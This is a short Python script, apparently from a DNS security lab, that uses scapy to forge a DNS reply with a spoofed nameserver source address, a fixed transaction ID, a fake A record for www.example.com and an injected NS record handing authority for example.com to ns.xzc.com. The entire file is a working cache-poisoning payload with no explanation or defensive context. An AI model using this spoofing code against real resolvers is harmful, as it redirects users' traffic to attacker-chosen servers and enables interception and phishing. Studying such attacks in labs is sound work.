#!/usr/bin/python
from scapy.all import *

name = "www.example.com"
domain = 'example.com'
ns = 'ns.xzc.com'
Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name,type='A',rdata='1.2.3.4',ttl=259200)
NSsec = DNSRR(rrname=domain,type='NS',rdata=ns,ttl=259200)
dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1, qdcount=1, ancount=1, nscount=1,
            arcount=0, qd=Qdsec, an=Anssec, ns=NSsec)
ip = IP(dst='172.17.0.3',src='199.43.135.53')
udp = UDP(dport=53,sport=33333,chksum=0)
reply = ip/udp/dns
send(reply)